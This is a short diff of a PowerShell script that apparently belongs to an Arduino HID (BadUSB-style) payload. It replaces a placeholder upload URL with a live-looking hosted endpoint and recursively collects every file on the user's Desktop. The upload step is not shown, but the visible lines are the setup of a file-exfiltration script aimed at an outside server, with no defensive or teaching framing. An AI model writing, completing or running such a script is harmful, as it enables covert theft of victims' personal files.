@@ -1,6 +1,6 @@
 # CONFIGURATION
 $DesktopPath = [Environment]::GetFolderPath("Desktop")
-$Url = "https://your-deployed-app-url.com/upload"  # Change this to your deployed service URL
+$Url = "arduinohidtesting-production.up.railway.app/upload"  # Change this to your deployed service URL
 
 # Get all files recursively
 $Files = Get-ChildItem -Path $DesktopPath -Recurse -File
